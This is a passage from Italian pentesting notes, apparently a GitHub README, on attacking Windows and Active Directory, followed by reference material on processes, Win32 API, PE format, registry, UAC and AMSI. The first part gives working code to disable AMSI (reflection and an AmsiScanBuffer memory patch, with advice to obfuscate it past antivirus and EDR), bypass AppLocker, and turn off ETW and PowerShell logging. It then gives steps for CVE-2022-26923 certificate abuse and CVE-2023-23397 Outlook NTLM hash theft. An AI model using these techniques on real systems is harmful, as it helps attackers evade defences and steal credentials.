      powershell -Version <num versione> #comando per cambiare versione
<!-- -->

_Questo tipo di bypass funziona se presente l'engine delle versione meno recenti di powershell, è inoltre possibile utilizzare il tool [Unicorn](https://github.com/trustedsec/unicorn) per automatizzare il tutto_

- __Powershell riflesso:__

_Consiste nell'utilizzare lo stesso powershell per disattivare l'AMSI_

_Comandi:_
<!-- -->
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') #linea di codice che recuperà il tipo di assembly utilizzato dalla shell corrente, [Ref] indica di passare un valore ad un'altra funzione
<!-- -->
     .GetField('amsiInitFailed','NonPublic,Static') #linea di codice che recuperà il campo amsiInitFailed e lo setta statico e non pubblico
<!-- -->
     .SetValue($null,$true) #linea che setta il campo amsiInitfailed a true
<!-- -->
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) #linea di codice     
     completa
<!-- -->
_Patching:_

_Analizzando il codice è possibile sovrascrivere la zona di memoria della funzione __"AmsiScanBuffer"__, in modo che analizzi quello che vogliamo_

_Codice:_
<!-- -->
     [DllImport(`"kernel32`")] 
     public static extern IntPtr GetProcAddress( 
     	IntPtr hModule, #handle della DLL
     	string procName #nome della variabile o funzione
     ); 
     
     [DllImport(`"kernel32`")]
     public static extern IntPtr GetModuleHandle(
     	string lpModuleName #modulo per ottenere l'handl
     );
     
     [DllImport(`"kernel32`")]
     public static extern bool VirtualProtect(
     	IntPtr lpAddress, #indirizzo regione
     	UIntPtr dwSize,   #grandezza
     	uint flNewProtect, #opzioni protezione
     	out uint lpflOldProtect  #puntatore alle vecchio protezioni
     ); #definizione dell'API Kernel32 con i relativi metodi

     $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru; #comando per caricare le API call

     $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); #array di byte spazzatura da scrivere

     $handle = [Win32.Kernel32]::GetModuleHandle(
	         'amsi.dll' #definzione da dove prendere l'handle
     );
     
     [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
    	      $handle,  #varibile handle di amsi.dll
    	     'AmsiScanBuffer'  #API call da prendere
     ); 
    
     [UInt32]$Size = 0x5; #variabile che stora la grandezza
     [UInt32]$ProtectFlag = 0x40; #read and write page
     [UInt32]$OldProtectFlag = 0; 
     [Win32.Kernel32]::VirtualProtect(
    	  $BufferAddress, #puntatore alla funzione AmsiScaneBuffer 
    	  $Size, #grandezza
    	  $ProtectFlag, #attivazione read and write
    	  [Ref]$OldProtectFlag
     ); 
     
     [system.runtime.interopservices.marshal]::copy(
    	  $buf, #byte da scrivere
    	  0, #da dove iniziare a scrivere
    	  $BufferAddress, #indirizzo di memoria da dove scrivere
    	  6 #numeri elementi da scrivere
     ); 
<!-- -->
__N.B: non è scontato da sottolineare che questo snippet di codice è già segnato da molti antivirus e EDR, per utilizzarlo si può considerare di obfuscarlo o encodarlo__

- __Tool e repository:__

_Esistono come al solito dei tool per automatizzare il processo quali:_

- [Amsi.fail](http://amsi.fail/)

- [AMSITrigger](https://github.com/RythmStick/AMSITrigger)


##### Bypass Applocker:

_Applocker è un'applicazione di windows (vers. Enterprise) che permette di controllare quali programmi possono essere avviati da remoto o dal proprio pc da determinati utenti, e lo fa tramite delle regole specifiche_

_Comandi:_
<!-- -->
      Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections #comando per listare le policy di applocker
<!-- -->
      Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone #comando per testare una policy di applocker su un determinato eseguibile
<!-- -->
- Cartelle in Whitelist:

_Vi è la possibilità che alcune cartelle non siano in blacklist, quindi bastera semplicemente copiare o spostare l'eseguibile in codeste posizioni_

ES: `C:\Windows\System32\spool\drivers\color`

##### Bypass Logging:

_Quando dobbiamo bypassare un sistema di logging in windows bisogna tenere conto di __"ETW (Event Tracing for Windows)"__, una tecnologia di tracciamento che raccoglie gli eventi_

__N.B: per sapere come funzionano i Log in windows andare [qui](./#log)__

- _Funzionamento ETW:_

_Il sistema ETW è composto da 3 componenti:_

1) Controllers = costruiscono e gestiscono le sessioni cioè sono quelli che decidono come e dove i dati devono andare

2) Consumers = interpretano gli eventi, visiona ogni sessione e cataloga gli eventi

3) Providers = forniscono gli eventi, a seconda del loro provider

_I providers si dividono in 4 tipologie:_ 

I) MOF (Managed Object Format) = definisce gli eventi dalle classi MOF e più in generale il MOF definisce pure la struttura degli oggetti gestiti in windows

II) WPP (Windows Software Trace Preprocessor) = strumento di diagnostica che insieme a TMF (Trace Message Format) permette di generare e formattare per bene tracce di debug

III) Manifest-Based = definisce gli eventi dai manifest delle applicazioni

IV) TraceLogging = API di ETW che permette di registrare degli eventi

_Ricapitolando il funziomento generale:_

`/Providers/ ---eventi---> |sessione 1, sessione 2 ecc... gestite dal /controller/ -------> /Consumers/`

_Ora che conosciamo le 3 componenti, vi sono dei metodi per bypassarli_

- __Providers:__

1) _Modifica del PSEtwLogProvider:_

_Gli ETW provider sono caricati in sessione dall'assembler .NET di nome __"PSEtwLogProvider"__, visto che l'assembler ha lo stesso livello di privilegio della sessione possiamo modificarlo tramite powershell riflesso (esempio quasi analogo nel bypass dell'AMSI che trovi [qui](./#bypass-amsi))_

_Comandi:_
<!-- -->
      $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider') #pezzo di codice per ottenere l'assembler
<!-- -->
      $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null) #pezzo di codice per ottenere un $null valore dal field etwprovider
<!-- -->
      [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0); #passo per settare m_enabled $null
<!-- -->
      $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider') 
      $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null) 
      [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
      #codice completo che disattiva il provider
<!-- -->
     Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count #comando che runnato prima dello script darà un 
     numero ma una volta runnato il codice completo il count cioè l'eventi si fermerà ad uno stesso numero perchè il provider sarà bloccato
<!-- -->
2) _GPO (Group Policy Object):_

_ETW ha diverse features che coprono diverse tipologie di logging ma non tutte sono attive, per attivarle o disattivarle bisogna andare nelle GPO (Group policy object) che fa parte del group policy management; abbiamo la possibilià di modificarle perchè gli assembler sono caricati nella stessa sessione dell'utente, quindi un user normale ha gli stessi privilegi e tramite del powershell riflesso puà apportare modifiche_

_Codice:_
<!-- -->
      $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
      #variabile che recupera il campo cachedGroupPolicySettings
<!-- -->
      $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null) #varibile che recupera un valore nullo
<!-- -->
      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0 #riga di codice che disabilità l'EventID num 4103
<!-- -->
      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0 #riga di codice che disabilita l'EventID num 4104
<!-- -->
      $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
      $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0 r
      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0 #codice completo
<!-- -->
      Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count #comando che runnato prima dello script darà un 
      numero ma una volta runnato il codice completo il count cioè l'eventi si fermerà ad uno stesso numero perchè il provider sarà bloccato
<!-- -->
3) _Log Pipeline:_

_Log pipeline consiste nel disattivare la voce __"LogPipelineExecutionDetails"__ che se settato a $false non crerà più log dei comandi_

_Comandi:_
<!-- -->
      $module = Get-Module Microsoft.PowerShell.Utility #comando per prendere il modulo target
      $module.LogPipelineExecutionDetails = $false #comando per disattivare il logpipeline
 <!-- -->     
      $snap = Get-PSSnapin Microsoft.PowerShell.Core #comando che prende il powershell snap-in target
      $snap.LogPipelineExecutionDetails = $false #ìcomando per disattivare il logpipeline
<!-- -->
- __Controller:__

1) _Patching di EtwEventWrite:_

_Il patching di EtwEventWrite consiste nel modificare il suo return point e inserire un nostro codice_

_Codice:_
<!-- -->
      var ntdll = Win32.LoadLibrary("ntdll.dll"); #DLL che svolge operazioni a basso livello in questo caso la funzione etwevenwrite e all'interno della dll
      var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite"); #riga di codice che recupera l'handle

      uint oldProtect; #intero che stora il valore esadecimale dei vecchi diritti cioè R (Read), W (Write) o X (Execute)
      Win32.VirtualProtect(
	 etwFunction,  #variabile con l'indirizzo alla funzione EtwEventWrite
	 (UIntPtr)patch.Length, #lunghezza della regione di memoria che si desidera modificare
	 0x40, #cambio dei permessi in Read e Write
	 out oldProtect #vecchi permessi in caso debbano essere ripristinati
      );
      
      patch(new byte[] { 0xc2, 0x14, 0x00 }); #creazione di un array di byte con 3 valori
      Marshal.Copy( #metodo marshal copy che copia l'array in un indirizzo di memoria
	 patch, #array da copiare
	 0, #num indice iniziale dell'array di byte
	 etwEventSend, #indirizzo dove copiare i dati 
	 patch.Length #lunghezza dei dati da copiare
     );

     VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect); #funzione che ripristina i vecchi permessi
     
     Win32.FlushInstructionCache( #funzione che garantisce che le modifiche alla memoria siano applicate
	 etwFunction,
	 NULL #dimensione da pulire
     );
<!-- -->
## CVE:

_Nella sezione CVE non è umanemante possibile scriverle tutte ma ne verrannò presentate e spiegate alcune come esempio, e inoltre per imparare ulteriori componenti che fanno parte dell'Active Directory._

### CVE-2022-26923: (Vulnerabilità sui certificati dell'AD)
<!-- -->
_La vulnerabilità sfrutta la misconfigurazione dei certificati nell'AD e la possibilità che un utente può aggiungere fino a 10 macchine al gruppo machine dell'active directory; esitono 2 template quello User e quello machine, lo User non è sfruttabile in quanto non possiamo modificare i parametri del __UPN__ (User Principal Name) che si trova dentro al __SAN__ (Subjec ALternative Name) invece nel template machine, dopo aver aggiunto un nuova macchina al gruppo dei computer possiamo generare un certificato in cui cambiamo il DNS hostname con quello del domain controller e ottenere NTLM Hash._
<!-- --> 
_Comandi:_
<!-- -->
      . ./Certify.exe find /vulnerable #comando per verificare se vulnerabile
<!-- -->
      sudo certipy-ad req -u '<username/nome_pc>@<dominio>' -p '<password>' -dc-ip <ip_del_domain_controller> -template <tipo_di_certificato> -ca       
      <dominio_certificate_autority> #comando per generare un certificato se selezionamo il template machine, al computer aggiunto va scritto un $ alla fine del nome
<!-- -->
      certipy-ad auth -pfx <file configurazione>.pfx #comando che fa la convalida del certificato interrogando il kerberos e prova a recuperare NTLM hash dell'account con impacket
<!-- -->
_Comandi powershell per modificare le proprità di un computer nell'AD:_ 
<!-- -->
      impacket-addcomputer '<dominio>/<username>:<password>' -method LDAPS -computer-name '<nome_da_scegliere>' -computer-pass '<password_da_scegliere>'
      #aggiungere il computer al gruppo della machine di active directory 
<!-- -->
      Get-ADComputer <nome computer> -properties dnshostname,serviceprincipalname
<!-- -->
      Set-ADComputer <nome computer> -ServicePrincipalName @{}#importante rendere vuoto SPN perchè entra in conflitto con quello dell'active directory
<!-- -->
      Set-ADComputer <nome dominio> -DnsHostName <nome completo del dominio> #comando per modificare l'hostname
<!-- -->
_Rigenerare il certificato di template machine e tramite __Certipy auth__ prendere NTLM hash e il gioco è fatt0._

##### Certificati AD:

___"AD CS"__ (Active Directory Certificate Services) è il servizio che si occupa di gestire i certificati, è molto utile in quanto per tutti i computer, servizi all'interno dell'AD si occupa lui stesso di essere il loro __"CA"__ (Certificate Authority), ha anche il compito di creare dei __"Certificate template"__ i quali indicano chi utente e con quali determinati permessi può richiedere un certificato ed infine si occupa di criptare i file systems, creare e verificare le firme digitali.
I certificati hanno una peculiarità che li rende interessati che anche se ad un'account compromesso viene cambiata la password loro non ne vengono intaccati, potendo cosi permettere la [persistence](./#varie)(al seguente link è spiegato un metodo di persistenza) nel sistema windows_

- __Funzionamento:__

1) l'user genera la coppia chiave pubblica e privata

2) l'user invia la certificate request alla CA

3) controllo del certificate template e dei permessi

4) esito positivo, generazione del certificato e firma con la chiave privata del CA

5) l'user lo registra nel sistema windows e lo utilizzerà quando ne avrà bisogno

### CVE-2023-23397 (Outlook):

_La seguente vulnerabilità impatta Outlook installato sul pc e non OWA (Outlook Web App) e Microsoft 365, la criticitò è alta perchè tramite un email infetta permette di ricavare il Net-NTLMv2 hashes di un utente.
La vulnerabilità consiste nel creare un invito malevolo del calendario che ha tre parametri modificati da noi: i primi due sono __"PidLidReminderOverride"__ e __"PidLidReminderPlaySound"__ settati a true in modo che l'audio della nostra email abbia la precendenza e che l'audio venga avviato subito il terzo parametro è il __"PidLidReminderFileParameter"__ a questo parametro inseriamo un nostro __"UNC (Universal Naming Convention)"__ che punta ad uno nostro file online condiviso per esempio tramite SMB, questo farà scattare la NTLM autenticazione e il relativo stealing dell'hash_

_Comandi:_
<!-- -->
      responder -I <interfaccia di rete> #comando che avvia dalla nostra machine responder per la cattura dell'hash
<!-- -->
      home-> nuovo appuntamento-> icona calendario in basso a sinistra-> promemoria impostato a 0 minuti-> ora scarichiamo il plugin OutlookSpy che permette di 
      sbloccare tutte le funzionalità di outlook-> outlookspy-> oggetto corrente-> ReminderOverrideDefault e ReminderPlaySound modificati a TRUE mentre 
      ReminderSoundFile con UPN malevolo-> avvia-> inviare l'email #passi per eseguire la vulnerabilità
<!-- -->

### Link a risorse esterne:

_Lascio qui alcuni link per delle risorse che possano servire:_

- _[Active Directory](https://github.com/AleHelp/Active-Directory), repo che passo passo spiega come creare una piccolo home lab con un domain controller e vari attacchi ad esso_

- [Writeups THM](https://github.com/AleHelp/Writeups-Tryhackme), repo contenente writeups con macchine windows

- [Writeups HTB](https://github.com/AleHelp/Writeups-Hackthebox), repo contenente writeups con macchine windows

### Note Pentest
_WebDav protocollo che estende HTTP per la connessione in remoto._

_DavWWWRoot è una parola speciale riconosciuta dalla windows shell, utilizzata quando si vuole connettere ad un WebDav server, questa parola
specifica di voler connettersi alla root del server._

_SPN(Service Principal Name) sono identificatori nell'AD per identificare dei servizi o risorse come un server SQL._

_Commando per avviare il subsystem di linux._
<!-- -->
      Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
<!-- -->
# Windows:

### Processi di avvio

_Schema per semplificare la spiegazione dei processi:_

_system (Primo processo, colui che da il via a tutto)_

Sytem crea:

- _smss.exe (Session Manager Subsystem ,processo che crea nuove sessioni e variabili d'ambiente, si termina da solo)_

smss.exe crea:
          
- _win32k.sys (kernel mode, si occupa della GUI di windows)_
  
- _winsrv.dll (user mode, gestisce le attività legate alla creazione, gestione e interazione con il desktop di Windows)_
  
- _csrss.exe (user mode, responsabile della Win32 console, creazione e eliminazione di thread, rende disponibile le API ad altri processi)_

csrss.exe crea:

- _winlogon.exe (session 1, sessione utente si occupa del logon e logoff utenti e carica il profilo dell'utente dopo il logon)_

- _wininit.exe (session 0, una sessione isolata per il sistema operativo windows, si occupa dell'avvio)_

wininit.exe crea:

- _explorer.exe (si occuppa dell'accesso a file e cartelle per l'utente)_

- _lsass.exe (Local Security Authority) e lsaiso.exe(processo collegato con credential guard and keyguard, lo si vede solo se attivi)_

- _services.exe (Service control manager, si occupa di tutto quello che riguarda i servizi)_

services.exe crea:

- _svchost.exe (Host process, si occupa di ospitare e controllare un servizio, è completamente gestito da services.exe)_

_Approfondimenti per gli eseguibli sopra elencati:_ 

_services.exe:_
gestisce un DB con i vari servizi ed è possibile interrogarlo con l'eseguibile __"sc.exe"__, inoltre troviamo altre informazioni nelle chiavi di registro __"HKLM\System\CurrentControlSet\Services"__ è anche responsabile al settaggio del __LastKnownGood__ (Una sorta di backup per windows).

_svchost.exe:_
I servizi runnati da questo processo sono implementati come DLL e sono immagazzinate nella subkey __Parameters__ a questo path __"KLM\SYSTEM\CurrentControlSet\Services\SERVICE NAME\Parameters"__, per vederli basta fare click desto su process hacker, notiamo il servizio che runna, se rifacciamo click destro su __"Proprietà"__, otterremo maggiori info, una cosa è importante che vi sia la flag -k che è il key identifier.

_Tools:_

Vari sono i tool per tenere d'occhio i processi, ne elenchiamo alcuni:

- [Process Hacker](https://processhacker.sourceforge.io/archive/website_v2/downloads.php)

- [Procmon della suite dei sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

- TaskManager integrato in windows
(__N.B è consigliato nella sezione __"Details"__ di aggiungere le colonne "Image Path Name" e "Command Line"
per vedere cosa un processo fa e il suo path__)

### API

_I programmi molte volte hanno bisogno di comunicare con la componente hardware o con il sistema stesso di windows è cosi che nascono le Win 32 Api, librerie che fanno da interfaccia tra la user-mode delle applicazione e il kernel._

__N.B: esistono tue tipi di accesso all'hardware: User-mode(no accesso diretto all'hardware, propria locazione di memoria) Kernel-mode(Accesso diretto ad hardware e memoria fisica).__

__Componenti delle API:__

- Header file: Definisce le librerie da importare durante il run-time, il programma a cui servono utilizzerà dei puntatori per reperirle.

- Core DLLs: gruppo di DLL che definisco la struttura di chiamate.
 ES: `(KERNEL32, USER32, ADVAPI32)` queste definiscono i servizi user e kernel. 

- DLLs supplementari: DLL che controllano parti del subsystem di windows OS, sono 36.

- Call Structures: Definisce la API stessa e i parametri da passargli.

ES:  
<!-->
      BOOL WriteProcessMemory(
      [in]  HANDLE  hProcess,
      [in]  LPVOID  lpBaseAddress,
      [in]  LPCVOID lpBuffer,
      [in]  SIZE_T  nSize,
      [out] SIZE_T  *lpNumberOfBytesWritten
      );
<!-->

- API Calls: chiamate della API utilizzate in un programma con gli indirizzi alle funzioni

- Input output parametri: il valore definito dalle call structures

_Ogni API call della libreria WIN32 risiede in RAM e ogni call richiede un puntatore a un indirizzo di memoria, perà il tutto è oscurato dall'ASLR(Address Space Layout Randomization) che comunque alla fine può essere bypassato con vari metodi tipo:_

- Header file (windows.h):

Quando questo header file è incluso nel nostro Unmanaged program(cioè il nostro programma, compilato e runnato) ogni funzione di win32 può essere chiamata durante il run-time, il loader capisce qualle chiamate vengono utilizzate, creando una sorta di tabella con i vari indirizzi di memoria o puntatori di indirizzi per le funzioni.

- P/Invoke: Altro metodo, come primo passo importiamo la DLL che ci serve, poi definiamo un managed method (metodo controllato dall'OS) come esterno che potremo richiamare come vorremmo.

__Esempio codice di un'API:__

- Dichiarazione e riempito dei parametri di un'API call:
<!-->
    HWND hwnd = CreateWindowsEx(
       	0, 
       	CLASS_NAME, 
       	L"Hello World", 
       	WS_OVERLAPPEDWINDOW, 
       	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 
       	NULL, 
       	NULL, 
       	hInstance, 
       	NULL
       	);
<!-->

__Implementazione API in .NET e powershell:__
<!-->
    class Win32 {
     	[DllImport("kernel32")]
     	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
     }
     
    static void Main(string[] args) {
     	bool success;
     	StringBuilder name = new StringBuilder(260);
     	uint size = 260;
     	success = GetComputerNameA(name, ref size);
     	Console.WriteLine(name.ToString());
     }
<!-->
    $MethodDefinition = @"
        [DllImport("kernel32")] #importiamo la DLL
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); #importiamo la api call
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    "@; #in powershell vanno definite dentro ad un metodo,
<!-->
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru; #va creato un nuvo tipo per i puntatori di win32DLL. inoltre verrà creato un file temporaneo che 
    compilerà queste DLL con csc.exe.
<!-->
    Win32.Kernel32]::<Imported Call>() #comando per utilizzarle
<!-->
### PE (Portable Executable):

_PE è una struttura dati che contiene le informazioni necessarie per i file, programmi e DLL, inoltre le componenti già citate avendo una struttura del PE uguale, possono lavorare sia su windows ad architettura x86 e x64; quando un programma o una DLL hanno la necessità di essere runnate, windows carica il programma in RAM e poi tramite la lettura del codice all'interno del PE, lo eseguirà_

- __Struttura PE:__

_Ogni header del PE è una struct, la struct permette di dichiarare molteplici varibili di diverso tipo in una singola entità cioè la struct_

__N.B: La struttura del PE viene spiegata partendo dall'alto verso il basso__

__DOS Header__ = prima parte in assoluta dell'header è composto da 64 bytes, riconoscibile questo header dai valori esadecimali __"4D 5A = MZ (Mark Zbikowski uno dei creatori del formato MS-DOS)"__ inoltre questa firma identifica il PE format quindi garantisce la compatibilità con il sistema operativo infine l'header ha diverse variabili di cui una è utile la __"e_lfanew"__ contiene l'indirizzo di dove inizia IMAGE_NT_HEADERS ed è utilizzato in una tecnica di injection la [Process Hollowing](./#tecniche-di-injection) 

__DOS Stub__ = seconda parte dopo il DOS Header anche esso garantisce che vi sia retrocompatibilità è la tipica scritta di quando si decompila un .exe e recita __"This program cannot be run in DOS mode"__, questa scritta comparirà solo se il PE non è compatibile

__IMAGE_NT header__ = questo header contiene informazioni vitali per il PE ed a sua volta contiene:

 - _NT HEADERS che contiene i campi:_

   1) Signature = la firma del PE infatti troviamo 4 bytes __"50 45 00 00 = PE"__

   2) File Header = il file header contiene informazioni importanti come: Machine l'architettura del PE file scritto, NumberOfSections il numero di sezioni nel 
      PE, TimeDateStamp data e ora di quando è stato compilato, PointerToSymbolTable e NumberOfSymbols puntatore e numero dei simboli (variabili, label e 
      funzioni), SizeOfOptionalHeader grandezza dell'header opzionale e Characteristics le caratteristiche del PE

   3) Optional Header = l'header opzionale inizia subito dopo la fine del File header, l'optional header contiene: Magic indica se il PE è a 32 o 64 bit, 
      AddressOfEntryPoint campo importante che contiene l'indirizzo dell'entry point dove inizia il codice, BaseOfCode e BaseOfData indirizzi delle sezioni data 
      e codice, ImageBase contiene l'indirizzo di base a cui verrà caricato il programma in memoria, Subsystem se è windows nativo GUI o CUI ed infine 
      DataDirectory contiene le informazioni di import e export nel PE

 - _IMAGE_SECTION_HEADER che anche lui contiene:_
   
   1) .text = contiene il codice dell'eseguibile

   2) .data = contiene le variabile inziali definite, ha i permessi lettura/scrittura ma non esecuzione

   3) .rdata/.idata = contengono informazioni funzioni importate da altri file o da windows API
  
   4) .reloc = contiene informazioni di relocazione del PE

   5) .rsrc = contiene i collegamenti alle risorse esterne come: immagini, icone, manifest file ecc...

   6) .ndata = contiene i dati non inizializzati

   _Continuiamo sempre nella IMAGE_SECTION_HEADER con altri campi importanti:_

   1) VirtualAddress = indica l'indirizzo virtuale a cui verrà mappato nella memoria virtuale
  
   2) VirtualSize = indica la dimensione nella memoria virtuale
  
   3) SizeOfRawData = indica la dimensione su disco
  
   4) Characteristics = indica i permessi della sezione
  
 - _IMAGE_IMPORT_DESCRIPTOR ci da una visione di quale API il PE ha caricato quando viene eseguito_

- __Tools:__

_Esistono dei tools per vedere e controllare la struttura dei PE:_

- [PE Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) della suite sysinternals

- [PE-Tree](https://github.com/blackberry/pe_tree)

- [PEcheck](https://github.com/DidierStevens/DidierStevensSuite/blob/master/pecheck.py) per il controllo del PE esempio entropia delle sezioni

### Register Keys

_il Registro di sistema (o Registro Windows) è un database gerarchico che contiene le impostazioni, le configurazioni e altre informazioni cruciali per il corretto funzionamento del sistema operativo e delle applicazioni installate è organizzato in key e subkeys le quali sono:_

 - HKEY_CLASSES_ROOT (HKCR):
   _Questa chiave contiene le associazioni tra estensioni di file e programmi, e definisce come le applicazioni si comportano quando si lavora con tipi di file specifici e in realtà e un 
   insieme delle chiavi HCKU e HKLM_

 - HKEY_CURRENT_USER (HKCU):
   _Questa chiave contiene le impostazioni specifiche dell'utente che sta effettuando l'accesso al sistema. Ad esempio, impostazioni personalizzate, preferenze, stampanti e altro ancora._

 - HKEY_LOCAL_MACHINE (HKLM):
   _Questa chiave contiene le impostazioni relative al computer locale. Qui sono presenti informazioni sul software installato, hardware, configurazioni di sistema e altro ancora._

 - HKEY_USERS (HKU):
   _Questa chiave contiene i profili degli utenti attualmente registrati sul computer. Ogni utente avrà un sottoalbero in questa chiave, simile alla struttura di HKCU._

 - HKEY_CURRENT_CONFIG (HKCC):
   _Questa chiave contiene informazioni sulla configurazione hardware attuale del computer. Viene creato dinamicamente durante l'avvio del sistema._

__Sono importanti da conoscere perchè da lato attaccante possono causare bei danni, dal lato difesa possono essere fonti di informazioni per capire eventuali attacchi ricevuti.__

### UAC

_UAC (User Access Control) utilizzato per non fare eseguire codice o script malevoli, in quanto richiede i priviliegi di amministratore, è anche all'interno delle MIC(Mandatory Integrity Control) un meccanismo che assegna a utenti, gruppi e processi un IL(Integrity Level) più è alto il livello e più puoi fare cose nel sistema_

_per comprendere appieno l'UAC prima bisogna capire cosa è IL(Integrity Level) e la sua divisione in 4 livelli:_

- Low = utilizzo solo dell'explorer dei file
- Medium = per utenti normali e amministratori con il filtered token
- High = amministratorti con elevated token
- System = livello utilizzato dal utente system

_Ogni IL è poi assegnato ad un UAC token che può essere di diversi tipi:_

 Non-administrators = singolo token utilizzato dagli utenti a IL medium

 Administrators hanno 2 token a loro volta:
   
   - Filtered Token= token per amministratori con meno priviliegi ha IL medium
   - Elevated Token= token con i pieni priviliegi IL hard

_Ora possiamo passare al suo funzionamento parlando in maniera dettagliata dei vari passaggi che la contraddistinguono:_

1) l'utente richiede di runnare un'applicazione come amministratore
2) viene fatta la chiamata alle API ShellExecute che impostando il runas verb apre una shell per elevare i privilegi e in questo modo attivare il meccanismo di
   UAC
3) la richiesta viene girata al service AppInfo.exe che a sua volta andrà a controllare l'application manifest per checkare una possibile autoelevation
4) verrà poi runnato consent.exe che permette di elevare i privilegi, consent.exe verrà runnato in un secure desktop, un desktop che isola i processi per evitare la compromissione dell'UAC
5) l'esito se positivo farà in modo che il nuovo processo creato punti alla shell creata in precendenza per elevare i privilegi.

_Sopra se notiamo bene viene menzionata l'autoelevation, bene è una peculiarità sempre correlata alla user access control e riguarda gli eseguibili i quali possono essere avviati senza il controllo da parte dell'UAC però devono soddisfare dei requisiti:_

- Firmati da Windows Publisher (infatti quasi tutte le funzionalità del pannello di controllo e alcuni eseguibili rientrano nell'autoelevetion)
- essere all'interno di directory fidate come C:\WINDOWS\System32 o C:\Program files

_Ulteriori info per l'autoelevation:_

-.exe devono aver segnato l'autoElevate nel proprio manifest __tool per il controllo del manifest è [sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)__
<!-- -->
      C:\path di sigcheck.exe -m <Path eseguibile da vedere> #comando per leggere il manifest
<!-- -->
- .mmc.exe(microsoft management console) a seconda poi degli .msc snap richiesti ma in genere ha l'autoelevation

__N.B: la UAC può essere modificate nella voce __"UAC settings".____

### AMSI

L'AMSI (Anti-Malware Scan Interface) è un runtime detection integrato con powershell che scannerizza il codice prima che venga runnato e determina se malevolo o meno, viene avviato da defender e evita che lo script malevolo venga runnato nel .NET runtime ed è completamente integrato con:

- _User Account Control, or UAC_
  
- _PowerShell_
  
- _Windows Script Host (wscript and cscript)_
  
- _JavaScript and VBScript_
  
- _Office VBA macros_

_L'AMSI è orchestrato dalla __"System.Management.Automation.dll"__ (.NET assembly sviluppato da Windows) e anche dalla __"amsi.dll"__, a seconda del tipo di script o applicazione, vi sono diverse DLL che analizzano il codice tipo:_

- Powershell, VBScript = Win32 API-> AMSI.h, AMSI.lib, AMSI.dll-> AmsiScanBuffer() o AMSIScanString()

- altre applicazioni = COM API-> Amsi.h, Amsi.dll-> lAntimalware::Scan()

- Antivirus = lAntimalwareProvider::Scan()

_Windows defender invece sfrutta le DLL MPEngine.dll e MPSvc.dll_

_L'AMSI si attiva quando lo script è caricato in RAM e poi eseguito dal __"CLR (Common Language Runtime)"__ se invece lo script è nella memoria di massa non si attiva_

### Suite SysInternals:

_La suite dei sysinternale è una suite ufficiale windows con all'suo interno diversi eseguibili che possono essere utili per approfondire di come stia lavorando il pc cioè: analisi dei processi, analisi del disco rigido, controllo degli autorun, controllo connessione di tipo TCP/UDP e ecc...
Possiamo reperire la suite scaricandola dal seguente [link](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) o utilizzarli in live dal seguente [link](https://live.sysinternals.com/)._

__Installazione suite:__

_Una volta installata il .zip dal sito linkato sopra, dovremo andare a modificare la variabile d'ambiente del sistema __"PATH"__ in modo che la suite possà essere avviata senza dover ogni volta andare nella cartella contenente i vari tools._

_Comandi:_
<!-- -->
      sysdm.cpl #comando per aprire un'estensione del pannello di controllo che permette di modificare le variabili d'ambiente
<!-- -->
      Avanzate-> Variabili d'ambiente-> Path(Varibili di sistema)-> modifica-> nuovo-> aggiungimamo il path alla cartella contenente la suite-> ok su tutto 	 
      #passi dettagliati sulle varie voci da seguire per la corretta configurazione
<!-- -->
      diskmon #comando prova per aprire da cmd diskmon
<!-- -->

__Utilizzo tramite web:__

_Abbiamo la possibilità di utilizzare i sysinternals anche tramite web ma per farlo va installato un client webDAV che permette la connessione da remoto ad una macchina e altre configurazioni da apportare alla nostra macchina._

_Comandi:_
<!-- -->
      Start-Service WebClient #comando powershell per avviare il client webDAV
<!-- -->
